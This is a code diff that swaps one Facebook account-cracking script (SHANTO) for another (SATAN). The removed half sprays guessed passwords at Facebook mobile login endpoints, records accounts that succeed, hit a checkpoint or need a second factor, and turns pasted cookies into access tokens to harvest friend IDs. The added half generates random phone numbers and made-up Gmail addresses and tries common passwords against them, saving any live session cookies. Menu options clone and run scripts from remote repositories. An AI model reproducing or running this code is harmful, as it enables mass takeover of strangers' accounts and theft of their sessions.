-    print(f" {WHITE}TODAY DATE     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-    print(f" {WHITE}USER NAME      : {BLUE}"+NameX)
-    print(f"{BLUE}══════════════════════════════════════════════════════")
-    print(f"{RED}[01] {WHITE}RANDOM CLONE {RED}[ Updated]")
-    print(f"{RED}[02] {WHITE}FILE CLONING{GREEN} [   BEST    ]")
-    print(f"{RED}[03] {WHITE}FILE CREATE  {GREEN}[NEW METHOD ] ")
-    print(f"{RED}[04] {WHITE}FILE CREATE  {GREEN}[ UNLIMITED ]")
-    print(f"{RED}[05] {WHITE}SPRATE LINKS FROM FILE")
-    print(f"{RED}[06] {WHITE}DUBBLE LINK CUTTER")
-    print(f"{RED}[07] {WHITE}DATA PROTECTOR")
-    print(f"{RED}[08] {WHITE}CYTHON CHANGER")
-    print(f"{RED}[09] {WHITE}FACEBOOK BOT")
-    print(f"{RED}[10] {WHITE}MY YOUTUBE CHANNEL")
-    print(f"{RED}[00] {WHITE}EXIT PROGRAM")
-    linex()
-    SHANTO = input("[√] CHOOSE : ")
-    if SHANTO in ["1","01"]: 
-        passx()
-    elif SHANTO in ["2","02"]:
-        file_crack()
-    elif SHANTO in ["3","03"]:
-        Filex()
-    elif SHANTO in ["4","04"]:
-        File_creating()
-    elif SHANTO in ["5","05"]:
-        saprate()
-    elif SHANTO in ["6","06"]:
-        remove_dub()
-    elif SHANTO in ["7","07"]:
-        PROTECT()
-    elif SHANTO in ["8","08"]:
-        CYTHONIZER()
-    elif SHANTO in ["9","09"]:
-        BOTX()
-    elif SHANTO in ["10","10"]:
-        os.system("xdg-open https://youtube.com/c/SHANTOworld")
-    elif SHANTO in ["0","00"]:
-        os.system('rm -rf fb_cookies.txt')
-        exit()
-    else:
-        print('\033[1;31mINCORECT OPTION !!!!');main()
-
-
-
-
-
-def File_creating():
-    os.system(f"git clone https://github.com/SHANTO-king-06/DUMP && cd DUMP && python DUMP.py")
-
-def PROTECT():
-    os.system(" rm -rf DATA_PROTECT && git clone https://github.com/SHANTO-king-06/DATA_PROTECT && cd DATA_PROTECT && python PROTECTOR.py")
-
-def CYTHONIZER():
-    os.system("rm -rf Cython_Changer && git clone https://github.com/SHANTO-king-06/Cython_Changer && cd Cython_Changer && python3 Run.py")
-
-
-def BOTX():
-    os.system("rm -rf BOT && git clone https://github.com/SHANTO-king-06/ BOT && cd BOTgit clone https://github.com/SHANTO-king-06/ BOT && cd BOT && python3 SHANTO.py")
-
-def file_crack():
-    global ok,cp,tf
-    os.system('clear')
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  S E R V E R   M E N U   \033[0;m] ')
-    print("")
-    print(f"{RED}[1] {WHITE}SERVER NUM 1 (BEST)")
-    print(f"{RED}[2] {WHITE}SERVER NUM 2 (NORMAL)")
-    linex()
-    opt_method = input(f'CHOOSE SERVER {SHANTO2} : ')
-    os.system('clear')
-    print(logo)
-    print('           \x1b[97m[\033[37;41m  F I L E   M E N U   \033[0;m] ') 
-    print("")
-    file = input(' FILE PATH: ')
-    try:
-        fo = open(file,'r').read().splitlines()
-    except FileNotFoundError:
-        print(' YOUR GIVEN FILE IS NOT FOUND IN STORAGE ⚠️ ...')
-        time.sleep(1)
-        file_crack()
-    plist = []
-    try:
-        clear()
-        print('           \x1b[97m[\033[37;41m  P A S S   M E N U   \033[0;m] ')
-        print("")
-        print(f"{WHITE}HOW MANY PASSWORDS YOU WANT TO ADD ")
-        print("FOR EXAMPLE (firstlast, First Last, first123, first last)")
-        print("")
-        ps_limit = int(input(' PUT LIMIT : '))
-    except:
-        ps_limit =1
-    print(' ')
-    for i in range(ps_limit):
-        plist.append(input(f' PUT PASS  {i+1}: '))
-    with ThreadPool(max_workers=30) as crack_submit:
-        os.system('clear')
-        print(logo)
-      #  show(' Use flight mode before using starting crack')
-        total_ids = str(len(fo))
-        print(f' {WHITE}TOTAL IDZ            {BLUE} : '+total_ids)
-        print(f" {WHITE}USER NAME             : {BLUE}"+NameX)
-        print(f" {WHITE}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(xc)+":"+str(lt()[4])+" "+ tag+" ")
-        print(f" {WHITE}TO STOP PROCESS PRESS Ctrl + Z ")
-        print(f" {WHITE}USE AEROPLANE MOOD FOR BOOST UP CLONING ")
-        linex()
-        for user in fo:
-            ids,names = user.split('|')
-            passlist = plist
-            if opt_method =='1':
-                crack_submit.submit(method1,ids,names,passlist,total_ids)
-            elif opt_method =='2':
-                crack_submit.submit(method2,ids,names,passlist,total_ids)
-            else:
-                crack_submit.submit(method1,ids,names,passlist,total_ids)
-    print('\n\033[1;37m[+]══════════════════════════════════════════')
-    print('[•] CLONING COMPLETED\n[•] YOUR OK IDS : '+str(len(ok))+'\n[•] TOTAL CP IDS : '+str(len(cp)))
-    print('\033[1;37m[+]══════════════════════════════════════════')
-    print('[•] OK IDS SAVE : /sdcard/SHANTO_OK.txt\n[•] CP IDS SAVE : /sdcard/SHANTO_CP.txt')
-    input('[•] PRESS ENTER TO BACK MENU   ')
-    main()
-def method1(ids,names,passlist,total_ids):
-    global loop,ok,cp,tf,ua_opera
-    rcol =['\033[1;32mM-1','\033[1;31mM-1']
-    rr = random.choice(rcol)
-    whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[SHANTO 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
-    try:
-        first = names.split(' ')[0]
-        try:
-            last = names.split(' ')[1]
-        except:
-            last = 'Khan'
-        ps = first.lower()
-        ps2 = last.lower()
-        for fikr in passlist:
-            ua = random.choice(ugen)
-            ua1 = random.choice(rug)
-            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-            r = requests.Session()
-            url1 = f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
-            hed1 = {"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua1,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            req1 = r.get(url1,headers=hed1)
-            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),'uid' : ids,'pass' : pas,'next' : f'https://p.facebook.com/login/save-device/','flow' : 'login_no_pin','submit' : 'Log In'}
-            url2 = f'https://p.facebook.com/login/device-based/validate-password/?shbl=0'
-            hed2 = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'en-US,en;q=0.9','x-requested-with': 'mark.via.gp','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': f'https://p.facebook.com','referer': f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua}
-            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
-            cookies = r.cookies.get_dict().keys()
-            if 'c_user' in cookies:
-                ##os.system("play-audio SHANTO_OK.mp3")
-                print('\r\033[1;32m[SHANTO-OK] '+ids+' | '+pas+'\033[1;97m')
-                ok.append(ids)
-                open('/sdcard/SHANTO_OK.txt', 'a').write(ids+' | '+pas+'\n')
-                break
-            elif 'checkpoint' in cookies:
-                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
-                #print(d.group(1))
-                if 'Enter login code to continue' in str(d):
-                    ##os.system("play-audio SHANTO_2F.mp3")
-                    print('\r\033[1;35m[SHANTO-2F] '+ids+' | '+pas+'\033[1;97m')
-                    tf.append(ids)
-                    open('/sdcard/SHANTO_2F.txt', 'a').write(ids+' | '+pas+'\n')
-                    break
-                else:
-                    ##os.system("play-audio SHANTO_CP.mp3")
-                    print('\r\033[1;31m[SHANTO-CP] '+ids+' | '+pas+'\033[1;97m')
-                    cp.append(ids)
-                    open('/sdcard/SHANTO_CP.txt', 'a').write(ids+' | '+pas+'\n')
-                    break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
-
-def method2(ids,names,passlist,total_ids):
-    global loop,ok,cp,tf,ua_opera
-    rcol =['\033[1;32mM-2','\033[1;31mM-2']
-    rr = random.choice(rcol)
-    whi = '\033[0;97m'
-    sys.stdout.write(f'\r%s {WHITE}[SHANTO 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
-    try:
-        first = names.split(' ')[0]
-        try:
-            last = names.split(' ')[1]
-        except:
-            last = 'Khan'
-        ps = first.lower()
-        ps2 = last.lower()
-        for fikr in passlist:
-            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-            session = requests.Session()
-            url = 'https://mbasic.facebook.com/?ref=opera_speed_dial_freefb'
-            raw = session.get(url).text
-            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),"li":re.search('name="li" value="(.*?)"', str(raw)).group(1),"try_number":"0","unrecognized_tries":"0","email":ids,"pass":pas,"login":"Log In"}
-            header = {'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://web.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,
-            'viewport-width': '980',
-}
-            post_request = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8&amp;ref=opera_speed_dial_freefb',data=payload,headers=header).text
-            cookies = session.cookies.get_dict().keys()
-            #open('jhuk.html', 'w').write(post_request)
-            if 'c_user' in cookies:
-                os.system("play-audio SHANTO_OK.mp3")
-                print('\r\033[1;32m[SHANTO-OK] '+ids+' | '+pas+'\033[0;97m')
-                ok.append(ids)
-                open('/sdcard/SHANTO_OK.txt', 'a').write(ids+' | '+pas+'\n')
-                break
-            elif 'checkpoint' in cookies:
-                d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
-                #print(d.group(1))
-                if 'Enter login code to continue' in str(d.group(1)):
-                    os.system("play-audio SHANTO_2F.mp3")
-                    print('\r\033[1;35m[SHANTO-2F] '+ids+' | '+pas+'\033[0;97m')
-                    tf.append(ids)
-                    open('/sdcard/SHANTO_2F.txt', 'a').write(ids+' | '+pas+'\n')
-                    break
-                else:
-                    os.system("play-audio SHANTO_CP.mp3")
-                    print('\r\033[1;31m[SHANTO-CP] '+ids+' | '+pas+'\033[0;97m')
-                    cp.append(ids)
-                    open('/sdcard/SHANTO_CP.txt', 'a').write(ids+' | '+pas+'\n')
-                    break
-            else:continue
-        loop+=1
-    except Exception as e:
-        pass
-
-def random_method(ids,passlist,total_ids):
-    global ua,loop,ok,cp,tf,ua_opera
-    rcol =['\033[1;32mO_O','\033[1;31m -_-']
-    rr = random.choice(rcol)
-    whi = '\033[0;97m'
-    sys.stdout.write(f'\r{WHITE}[SHANTO 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
-    try:
-        for pas in passlist:
-            xyz = requests.Session()
-            pro = random.choice(rug)
-            header = {'authority': 'www.facebook.com',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://web.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Linux"',
-            'sec-ch-ua-platform-version': '""',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-site',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro,
-            'viewport-width': '980',
-}
-            url = 'https://free.facebook.com/?ref=opera_speed_dial_freefb'
-            raw = xyz.get(url).text
-            koki = (";").join([ "%s=%s" % (key, value) for key, value in xyz.cookies.get_dict().items() ])
-            koki+=' m_pixel_ratio=2; wd=412x756'
-            payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(raw)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(raw)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(raw)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(raw)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":ids,
-            "pass":pas,
-            "login":"Log In",
-            "_fb_noscript":"true"
-            }
-            post_request = xyz.post('https://business.facebook.com/login/device-based/regular/login/?refsrc',data=payload,headers=header,cookies={'cookie':koki}).text
-            #open('iii.html', 'w').write(post_request)
-            cookies = xyz.cookies.get_dict().keys()
-            if 'c_user' in cookies:
-                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
-                cid = coki[7:22]
-                if cid in ok:
-                    pass
-                else:
-                    ##os.system("play-audio SHANTO_OK.mp3")
-                    print('\r\033[1;92m[SHANTO-OK] '+cid+' | '+pas+'\033[0;97m')
-                    ok.append(cid)
-                    open('/sdcard/SHANTO_OK.txt', 'a').write(cid+' | '+pas+'\n')
-                    break
-            elif 'checkpoint' in cookies:
-                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
-                cid = coki[24:39]
-                if cid in tf:
-                    pass
-                else:
-                    d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
-                    if 'Enter login code to continue' in str(d.group(1)):
-                        ##os.system("play-audio SHANTO_2F.mp3")
-                        print('\r\033[1;95m[SHANTO-2F] '+cid+' | '+pas+'\033[0;97m')
-                        tf.append(cid)
-                        open('/sdcard/SHANTO_2F.txt', 'a').write(cid+' | '+pas+'\n')
-                        break
-                    else:
-                        if cid in cp:
-                            pass
+def afg():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 9377,9379,9374')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan','afghan12345','afghan123','600700','afghanistan','afghan1122','500500','100200','10002000','900900','kabul123','Û±Û³Û³Û³ÛµÛ¶Û·Û¸Û¹','Û±Û³Û³Û³ÛµÛ¶','afghan1234','kabul1234','khankhan','khan123','khan123456','khan786']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+def ind():
+                user=[]
+                clear()
+                print('\x1b[1;92m EXAMPLE CODE EXAMPLE : 91***,etc')
+                code = input('\033[1;37m PUT CODE: ')
+                try:
+                        limit = int(input('\x1b[1;92m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as S1N:     
+                        clear()
+                        
+                        tl = str(len(user))
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mTOTAL ACCOUNT: \033[1;97m'+tl)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mSELECT CODE: \033[1;97m '+code)
+                        print('\x1b[1;97m [\x1b[1;92m•\x1b[1;97m] \x1b[1;97mCRACKING....ON \033[1;97m')
+                        line()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'57273200','hindustan','59039200','57575751']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' PRESS ENTER TO BACK ')
+                os.system('python s1n.py')
+                
+def gmail():
+                os.system('rm -rf .re.txt')
+                clear()
+                print('\033[1;37m Example: eshal, ali, abbas, agnel\033[1;97m')
+                line()
+                first = input(' Put first name: ')
+                line()
+                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                line()
+                last = input(' Put last name: ')
+                line()
+                print(' Example: @gmail.com , @yahoo.com etc...')
+                line()
+                domain = input(' domain: ')
+                line()
+                try:
+                        limit=int(input(' Put limit: '))
+                except ValueError:
+                        limit = 5000
+                line()
+                print(' Getting gmails...')
+                lists = ['3','4']
+                for xd in range(limit):
+                        lchoice = random.choice(lists)
+                        if '3' in lchoice:
+                                mail = ''.join(random.choice(string.digits) for _ in range(3))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
                         else:
-                            ##os.system("play-audio SHANTO_CP.mp3")
-                            print('\r\033[1;94m[SHANTO-CP] '+cid+' | '+pas+'\033[0;97m')
-                            cp.append(cid)
-                            open('/sdcard/SHANTO_CP.txt', 'a').write(cid+' | '+pas+'\n')
-                            break
-            else:continue
-         #   else:
-               # print(ua_opera)
+                                mail = ''.join(random.choice(string.digits) for _ in range(4))
+                                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
+                        fo = open('.re.txt', 'r').read().splitlines()
+                with tred(max_workers=30) as S1N:
+                        total = str(len(fo))
+                        clear()
+                        print(' TOTAL ACCOUNT: \033[1;32m'+total)
+                        print(' \x1b[1;97mSELECT EMAIL: \033[1;32m'+domain)
+                        print(" \x1b[1;97mEMAIL CRACKING.... ON\x1b[1;97m")                        
+                        line()
+                        for user in fo:
+                                ids,names = user.split('|')
+                                first_name = names.rsplit(' ')[0]
+                                try:
+                                        last_name = names.rsplit(' ')[1]
+                                except IndexError:
+                                        last_name = 'Khan'
+                                fs = first_name.lower()
+                                ls = last_name.lower()
+                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12',ls+'123',fs+ls+'123',ls+'12345','khankhan','57273200']
+                                S1N.submit(rd,ids,passlist)
+                print('\033[1;37m')
+                line()
+                print(' THE PROCESS HAS COMPLETED')
+                print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                line()
+                input(' Press enter to back ')
+                os.system('python s1n.py')
+
+def ffb(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mM3\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(' ')[0]
+                try:
+                        last = names.split(' ')[1]
+                except:
+                        last = 'Khan'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+                        pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
+                        ua=random.choice(S1())
+                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        Aws=session.cookies.get_dict().keys()
+                        if "c_user" in Aws:
+                                coki=session.cookies.get_dict()
+                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print('\r\r\033[1;32m [SATAN-OK] %s | %s'%(ids,pas))
+                                open('/sdcard/SATAN-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SATAN-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
+                              
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in Aws:
+                                if 'y' in pcp:
+                                        #print('\r\r\x1b[38;5;208m [SATAN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/SATAN-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
         loop+=1
-    except Exception as e:
-        pass
-
-
-
-
-
-
-
-
-
-
-
-################[FILE CLONE]###################
-def Filex():
-    os.system("clear")
-    print(logo) 
-    print("[01] CREATE FILE")
-    print("[02] REMOVE OLD COOKIES")
-    print("[E] EXIT")
-    linex() 
-    check=input(f" CHOOSE {SHANTO2} :")
-    if check in ['01','1']:
-        file_m()
-    elif check in ['02','2']:
-        os.system("rm -rf  .cok.txt")
-        os.system("rm -rf  .tok.txt")
-        print("SUCCESSFUL LY COOKIES REMOVED ")
-    elif check in ['e','E']:
-        exit()
-
-def convert(cookie):
-    cookies = {"cookie":cookie}
-    res = requests.Session().get('https://business.facebook.com/business_locations', headers = {
-        'user-agent'     :     'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36',
-        'referer'     :     'https://www.facebook.com/',
-        'host'     :     'business.facebook.com',
-        'origin'     :     'https://business.facebook.com',
-        'upgrade-insecure-requests'     :     '1',
-        'accept-language'     :     'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
-        'cache-control'     :     'max-age=0',
-        'accept'     :     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-        'content-type'     :     'text/html; charset=utf-8'
-        }, cookies = cookies)
-    try:
-        token = re.search('(EAAG\w+)',str(res.text)).group(1)
-    except:
-        token = "Cookies Invalid"
-    finally:
-        return token
-
-
-
-def file_m():
-    list_ = []
-    os.system("clear")
-    print(logo)
-    try:
-        tok = open(".tok.txt",'r').read()
-        cok = open(".cok.txt",'r').read()
-    except:
-        os.system("clear")
-        print(logo)
-        cookie = input(" Putt cookies : ")
-        token = convert(cookie)
-        if token == "Cookies Invalid":
-            print(" Coockies expire use new to login")
-            time.sleep(4)
-            Filex()
-        else:
-            open(".cok.txt",'w').write(cookie)
-            open(".tok.txt",'w').write(token)
-            file_m()
-    try:
-        r_n = requests.get(f"https://graph.facebook.com/me?fields=name,id&access_token={tok}",cookies={"cookie":cok}).json()
-        print(f"\t   {GREEN}   welcome :  "+(r_n["name"]))
-        time.sleep(2)
-        pass
-    except:
-        print(" token and cookies expire")
-        time.sleep(2)
-        os.system("rm -rf .cok.txt")
-        os.system("rm -rf .tok.txt")
-        Filex()
-    os.system("clear")
-    print(logo)
-    print(" example digits : 100083 100084 100085 etc")
-    print("")
-    linkx = input(" PUT EXTRACT DIGIT: ")
-    link1 = linkx.replace(" ", "\n")
-    link1 = link1.splitlines()
-    lines = []
-    fav = []
-    print("\n\n")
-    linex()
-    paste = "PASTE IDZ  :"
-    while True:
-        line = input(''+paste+'')
-        if line:
-            lines.append(line)
-            paste = " PRESS ENTER "
-        else:
-            break
-    os.system("clear")
-    print(logo)
-    print(f"          \x1b[97m[\033[37;41m  DUMPING STARTED BE PATIENT.. ❤ \033[0;m] ")
-    linex()
-    print("")
-    for xid in lines:
-        sys.stdout.write("\r from: [{}] links: [{}] total:[{}]".format(xid, linkx, str(len(fav))))
-        sys.stdout.flush()
-        try:
-            xx = requests.get('https://graph.facebook.com/'+xid+'?fields=friends.fields(name,id)&access_token='+tok,cookies={"cookie":cok}).json()['friends']
-            for xc in xx["data"]:
-                for fav_links in link1:
-                    if fav_links in xc["id"]:
-                        fav.append(xc["id"]+"|"+xc["name"])
-                        open("filemere.txt",'a').write(xc["id"]+"\n")
-                    else:
-                        pass
-        except(KeyError,IOError,OSError):
-            pass
-    print("")
-    print('\n Example: /sdcard/SHANTO.txt ')
-    print("")
-    s_file = input(" ENTER FILE PATH: ")
-    for uuids in fav:
-        try:
-            open(s_file,'a').write(uuids+"\n")
-        except:
-            print(" PUT CORRECT ✔ PATH")
-            print("")
-            linex()
-            print(" YOUR FILE SAVE IN: "+s_file)
-            input(" PRESS ENTER TO BACK")
-            linex()
-            Filex()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-clear()
-print("\n\n")
-xxxx = str(len(rug))
-jalan(" \x1b[38;5;196mTOTAL USER AGENTS : " + xxxx)
-print(" HEY USER GIVE ME SOME YOUR INFORMATION ❤")
-print("")
-NameX =input('\x1b[38;5;46m [•] \x1b[38;5;46mWHAT IS YOUR NAME : ')
-
-def linex():
-    print(f'{RED}======================================================')
-
-#---------------------[LOOP MENU]---------------------#
-loop = 0
-cp = []
-ok = []
-twf = []
-
-
-
-#---------------------[APPLICATION CHECKER]---------------------#
-def cek_apk(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Active  Apk  ')
-    else:
-        print(f'\r[🎮] \x1b[38;5;46m ☆ Your Active Apps ☆     :{WHITE}')
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-            #created by hbf team(owner) SHANTO
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r\x1b[38;5;46m[\x1b[38;5;196m!\x1b[38;5;46m] \x1b[38;5;196mSorry there is no Expired Apk{WHITE}')
-        print(54*'-')
-    else:
-        print(f'\r[🎮] \x1b[38;5;196m ◇ Your Expired Apps ◇    :{WHITE}')
-        for i in range(len(game)):
-            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print(57*'-')
-
- 
-
-def follow(ses,coki):
